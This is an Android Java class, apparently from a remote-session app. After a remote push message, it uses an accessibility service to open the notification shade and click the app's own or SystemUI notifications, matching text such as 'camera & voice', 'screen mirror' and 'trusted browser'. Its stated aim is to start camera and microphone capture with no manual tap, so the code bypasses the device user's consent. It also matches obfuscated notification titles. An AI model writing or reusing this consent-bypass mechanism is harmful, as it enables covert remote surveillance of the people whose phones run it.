package com.autoreplybot.remote;

import android.accessibilityservice.AccessibilityService;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;

/**
 * After a trusted {@code session_auto_start} FCM, arm accessibility to click our
 * heads-up / shade notification so camera/mic can start without a manual tap.
 * Only matches our package or SystemUI rows that contain our known notification copy.
 */
public final class RemoteSessionNotifAutoClick {
    private static final String TAG = "RemoteSessionNotifClick";
    private static final Handler MAIN = new Handler(Looper.getMainLooper());
    private static final Object ARM_TOKEN = new Object();

    private static final AtomicLong ARMED_UNTIL_MS = new AtomicLong(0L);
    private static final AtomicBoolean CLICKED = new AtomicBoolean(false);
    private static final AtomicBoolean SHADE_OPENED = new AtomicBoolean(false);

    private static final String[] MATCH_PHRASES = {
            "notification 1 received click",
            "remote session",
            "camera & voice",
            "camera and voice",
            "screen mirror",
            "tap to start",
            "platform admin",
            "trusted browser"
    };

    private RemoteSessionNotifAutoClick() {}

    public static void arm(long ttlMs) {
        CLICKED.set(false);
        SHADE_OPENED.set(false);
        ARMED_UNTIL_MS.set(System.currentTimeMillis() + Math.max(1000L, ttlMs));
        Log.i(TAG, "armed for " + ttlMs + "ms (a11y connected="
                + RemoteAccessibilityService.isConnected() + ")");
        MAIN.removeCallbacksAndMessages(ARM_TOKEN);
        long[] delays = {80L, 250L, 500L, 900L, 1500L, 2500L, 4000L, 6500L, 9000L, 12000L};
        for (long d : delays) {
            MAIN.postAtTime(() -> {
                RemoteAccessibilityService svc = RemoteAccessibilityService.getInstance();
                if (svc == null) return;
                tryClick(svc);
            }, ARM_TOKEN, SystemClock.uptimeMillis() + d);
        }
    }

    public static void disarm() {
        ARMED_UNTIL_MS.set(0L);
        CLICKED.set(false);
        SHADE_OPENED.set(false);
        MAIN.removeCallbacksAndMessages(ARM_TOKEN);
    }

    public static boolean isArmed() {
        if (CLICKED.get()) return false;
        return System.currentTimeMillis() < ARMED_UNTIL_MS.get();
    }

    public static boolean tryClick(@NonNull AccessibilityService service) {
        if (!isArmed()) return false;
        try {
            if (SHADE_OPENED.compareAndSet(false, true)) {
                try {
                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS);
                } catch (Throwable ignored) {
                }
            }
            String ourPkg = service.getPackageName();
            List<AccessibilityNodeInfo> roots = collectRoots(service);
            try {
                for (AccessibilityNodeInfo root : roots) {
                    if (root == null) continue;
                    if (scanAndClick(root, ourPkg)) {
                        CLICKED.set(true);
                        ARMED_UNTIL_MS.set(0L);
                        Log.i(TAG, "auto-clicked session notification");
                        return true;
                    }
                }
            } finally {
                for (AccessibilityNodeInfo root : roots) {
                    if (root != null) root.recycle();
                }
            }
        } catch (Throwable t) {
            Log.w(TAG, "tryClick failed", t);
        }
        return false;
    }

    private static boolean scanAndClick(@NonNull AccessibilityNodeInfo root, @Nullable String ourPkg) {
        ArrayList<AccessibilityNodeInfo> stack = new ArrayList<>();
        stack.add(root);
        // Do not recycle root here — caller owns it. Clone children only.
        int guard = 0;
        while (!stack.isEmpty() && guard++ < 400) {
            AccessibilityNodeInfo node = stack.remove(stack.size() - 1);
            if (node == null) continue;
            boolean recycleNode = node != root;
            try {
                CharSequence np = node.getPackageName();
                String nodePkg = np != null ? np.toString() : "";
                boolean ourApp = ourPkg != null && ourPkg.equals(nodePkg);
                boolean systemUi = "com.android.systemui".equals(nodePkg);
                String text = (safe(node.getText()) + " " + safe(node.getContentDescription()))
                        .toLowerCase(Locale.US);
                if ((ourApp || systemUi) && matchesPhrase(text)) {
                    if (clickNodeOrAncestor(node)) return true;
                }
                for (int i = 0; i < node.getChildCount(); i++) {
                    AccessibilityNodeInfo child = node.getChild(i);
                    if (child != null) stack.add(child);
                }
            } finally {
                if (recycleNode) node.recycle();
            }
        }
        // Recycle remaining children (not root)
        for (AccessibilityNodeInfo left : stack) {
            if (left != null && left != root) left.recycle();
        }
        return false;
    }

    private static boolean matchesPhrase(@NonNull String text) {
        if (text.isEmpty()) return false;
        for (String p : MATCH_PHRASES) {
            if (text.contains(p)) return true;
        }
        // Obfuscated title-only rows: "notification" alone on our package is enough.
        return text.contains("notification") && text.contains("click");
    }

    private static boolean clickNodeOrAncestor(@NonNull AccessibilityNodeInfo node) {
        AccessibilityNodeInfo cur = AccessibilityNodeInfo.obtain(node);
        try {
            for (int i = 0; i < 8 && cur != null; i++) {
                if (cur.isClickable()) {
                    return cur.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }
                AccessibilityNodeInfo parent = cur.getParent();
                cur.recycle();
                cur = parent;
            }
        } finally {
            if (cur != null) cur.recycle();
        }
        return false;
    }

    @NonNull
    private static List<AccessibilityNodeInfo> collectRoots(@NonNull AccessibilityService service) {
        List<AccessibilityNodeInfo> out = new ArrayList<>();
        try {
            List<AccessibilityWindowInfo> windows = service.getWindows();
            if (windows != null) {
                for (AccessibilityWindowInfo w : windows) {
                    if (w == null) continue;
                    AccessibilityNodeInfo r = w.getRoot();
                    if (r != null) out.add(r);
                }
            }
        } catch (Throwable ignored) {
        }
        try {
            AccessibilityNodeInfo active = service.getRootInActiveWindow();
            if (active != null) out.add(active);
        } catch (Throwable ignored) {
        }
        return out;
    }

    @NonNull
    private static String safe(@Nullable CharSequence cs) {
        return cs == null ? "" : cs.toString().trim();
    }
}
